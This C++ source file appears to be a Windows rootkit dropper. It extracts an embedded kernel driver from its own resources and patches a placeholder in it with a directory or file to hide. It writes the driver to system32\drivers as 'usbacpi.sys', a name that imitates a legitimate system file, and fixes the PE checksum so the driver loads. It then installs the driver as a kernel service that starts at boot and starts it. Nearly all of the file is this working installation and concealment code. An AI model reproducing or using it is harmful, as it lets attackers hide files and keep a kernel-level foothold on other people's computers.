// exe.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "resource.h"

#define dbg_msg(fmt, ...)  do{ \
    printf( "%d::%s():"##fmt##"\n",\
    __LINE__,\
    __FUNCTION__,\
    __VA_ARGS__);\
}while(0)

#define SERVICE_NAME L"usbacpi"
#define SYSPATH L"%SystemRoot%\\system32\\drivers\\usbacpi.sys"

/*
字符串连接函数 
@d 目标字符串
@s 源字符串
@n 目标最大可以保存的字符串数量 包括末尾的 \0
@return 返回连接后的字符串
*/
__forceinline WCHAR *av_wcsncat(WCHAR *d, const WCHAR *s,int n)
{
    int i = 0;
    for(i = wcslen(d);i < n - 1 && *s;i++,s++)
    {
        d[i] = *s;
    }
	d[i] = 0;
    return d;
}

/*
安装驱动服务
@SchSCManager 服务管理器的句柄
@DriverName 服务的名称
@ServiceExe 服务的可执行文件的路径
@return 成功返回 TRUE 失败返回FALSE
*/
BOOL av_InstallDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, IN LPCTSTR ServiceExe )
{
    SC_HANDLE  schService;

    schService = CreateService( SchSCManager,          // SCManager database
        DriverName,           // name of service
        DriverName,           // name to display
        SERVICE_ALL_ACCESS,    // desired access
        SERVICE_KERNEL_DRIVER, // service type
        SERVICE_SYSTEM_START, // SERVICE_DEMAND_START,  // start type
        SERVICE_ERROR_NORMAL,  // error control type
        ServiceExe,            // service's binary
        NULL,                  // no load ordering group
        NULL,                  // no tag identifier
        NULL,                  // no dependencies
        NULL,                  // LocalSystem account
        NULL                   // no password
        );
    if ( schService == NULL )
        return FALSE;

    CloseServiceHandle( schService );

    return TRUE;
}

/*
启动服务
@SchSCManager 服务管理器的句柄
@DriverName 服务的名称
@return 成功返回TRUE 失败返回FALSE
*/
BOOL av_StartDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE  schService;
    BOOL       ret;

    schService = OpenService( SchSCManager,
        DriverName,
        SERVICE_ALL_ACCESS
        );
    if ( schService == NULL )
        return FALSE;

    ret = StartService( schService, 0, NULL )
        || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING 
        || GetLastError() == ERROR_SERVICE_DISABLED;

    CloseServiceHandle( schService );
    return ret;
}

//加载驱动  将驱动和该文件放到相同的
BOOLEAN av_InstallAvhook()
{
    SC_HANDLE	schSCManager;
    //WCHAR avPath[MAX_PATH];
    //WCHAR *ServiceName = L"avhook";

    //GetCurrentDirectoryW(MAX_PATH,avPath);
    //av_wcsncat(avPath,L"\\avhook.sys",MAX_PATH);

    //dbg_msg("get sys path : %S \n",avPath);
    schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

    if(av_InstallDriver( schSCManager, SERVICE_NAME, SYSPATH ))
    {

    }
    else
    {
        dbg_msg("install avhook service failed !!\n");
    }

    if(!av_StartDriver( schSCManager, SERVICE_NAME ))
    {
        dbg_msg("start sys service failed \n");
        return FALSE;
    }
    return TRUE;
}

int memfind(const char *mem, /*要查找内存块的起始地址*/
			const char *str, /*要在其中查找的字符串或者xxx*/
			int sizem, /*内存块的大小*/
			int sizes/*要查找的字符串的大小*/
			)   
{   
	int   da,i,j;   
	if (sizes == 0) 
		da = strlen(str);   /*如果sizes为0 则认为 str 表示的是字符串*/
	else 
		da = sizes;   
	for (i = 0; i <= sizem - da; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	
				break;   
		if (j == da) 
			return i;   /*找到了 返回其在内存中的偏移*/
	}   
	return -1;   
}


/*
字符串复制函数
@d 目标内存
@s 源字符串
@n 目标内存中可以存放的最多字符数量 保护末尾的 \0
@return 返回 d
*/
__forceinline WCHAR *av_wcsncpy(WCHAR *d , const WCHAR *s , int n)
{
    int i = 0;
    for(i = 0;i < n - 1 && *s;i++,s++)
    {
        d[i] = *s;
    }
	d[i] = 0;
    return d;
}

USHORT   
ChkSum(   
       ULONG PartialSum,   
       PUSHORT Source,   
       ULONG Length   
       )   
          
{   
       
    while (Length--) {   
        PartialSum += *Source++;   
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);   
    }   
       
       
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);   
}   
   
 
BOOL CountChectSum(WCHAR *fileName)   
{   
    DWORD buffSize;   
    PWORD AdjustSum;   
    HANDLE hFile=CreateFile(fileName,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);   
    if(hFile==INVALID_HANDLE_VALUE)   
    {   
        printf("CreateFile Failed\n");   
        return FALSE;   
    }   
    buffSize=GetFileSize(hFile,NULL);   
       
    HANDLE hMap=CreateFileMapping(hFile,NULL,PAGE_READWRITE,NULL,NULL,NULL);   
    if(hMap==INVALID_HANDLE_VALUE)   
    {   
        printf("CreateFileMapping Failed\n");   
        return FALSE;   
    }   
       
    LPVOID lpBase=MapViewOfFile(hMap,FILE_MAP_WRITE,0,0,0);   
    if(lpBase==NULL)   
    {   
        printf("MapViewOfFile Failed\n");   
        return FALSE;      
    }   
    USHORT PartialSum;   
    PIMAGE_NT_HEADERS32 ntHeader;   
    PIMAGE_DOS_HEADER dosHeader;   
    PartialSum = ChkSum(0, (PUSHORT)lpBase, (buffSize + 1) >> 1);   
    dosHeader=(PIMAGE_DOS_HEADER)lpBase;   
    ntHeader=(PIMAGE_NT_HEADERS32)(dosHeader->e_lfanew+(DWORD)lpBase);   
    if(ntHeader->OptionalHeader.Magic == 0x10B)   
    {   
        printf("Magic == 0x10B\n");   
        AdjustSum = (PUSHORT)(&((PIMAGE_NT_HEADERS32)ntHeader)->OptionalHeader.CheckSum);   
        PartialSum -= (PartialSum < AdjustSum[0]);   
        PartialSum -= AdjustSum[0];   
        PartialSum -= (PartialSum < AdjustSum[1]);   
        PartialSum -= AdjustSum[1];   
   
    }   
    ntHeader->OptionalHeader.CheckSum=(DWORD)PartialSum+buffSize;   
    FlushViewOfFile(lpBase,0);   
    UnmapViewOfFile(lpBase);   
    CloseHandle(hMap);   
    CloseHandle(hFile);   
    return TRUE;   
   
}   

BOOLEAN ChangeConfig(UCHAR *data,ULONG size,WCHAR *HideDir)
{
    UCHAR *buff = (UCHAR *)malloc(size);
    if(!buff)
        return FALSE;
    memcpy(buff,data,size);

	int offset ;
	WCHAR *flag = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    if(( offset = memfind((CONST CHAR *)buff,(const char *)flag,size,wcslen(flag) * 2)) > 0)
	{
        av_wcsncpy((WCHAR *)(buff + offset),HideDir,500);

        WCHAR fileName[MAX_PATH];
        ExpandEnvironmentStrings(SYSPATH,fileName,500);
        dbg_msg("get sys filename %S ",fileName);
        HANDLE hfile =  CreateFile(fileName,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
        if(INVALID_HANDLE_VALUE == hfile)
        {
            dbg_msg("can not create sys file ~!");
            free(buff);
            return FALSE;
        }
        DWORD bytes = 0;
        WriteFile(hfile,buff,size,&bytes,NULL);
        FlushFileBuffers(hfile);
        CloseHandle(hfile);

        free(buff);
        //对于驱动文件需要重新计算下文件的校验值 不然驱动加载不了

        CountChectSum(fileName);

        return TRUE;
	}

    if(buff)
        free(buff);

    return FALSE;
}

BOOLEAN DumpSys(WCHAR *HideDir)
{
    BOOLEAN ret = FALSE;
    HMODULE hMod = GetModuleHandle(NULL);
    HRSRC hrsrc = FindResource(hMod,MAKEINTRESOURCE(103),L"SYS");
    if(hrsrc!=NULL)
    {
        DWORD dw_size = SizeofResource(hMod,hrsrc);
        HGLOBAL hgl = LoadResource(hMod,hrsrc);
        LPVOID lp_data = LockResource(hgl);

        if(ChangeConfig((UCHAR *)lp_data,dw_size,HideDir))
        {
            ret = TRUE;
        }
        FreeResource(hgl);
    }
    return ret;
}

int _tmain(int argc, _TCHAR* argv[])
{
    if(argc < 2)
    {
        printf("Usage:%S <hide dir | file> \n",argv[0]);
        return -1;
    }
    dbg_msg("get hide file name %S ",argv[1]);
    //先从资源中释放驱动 到 system32\driver 然后 加载驱动  加载成功后删除驱动文件
    if(DumpSys(argv[1]))
    {
        if(av_InstallAvhook())
        {
            printf("everything is OK ~!\n");
        }
    }
	return 0;
}

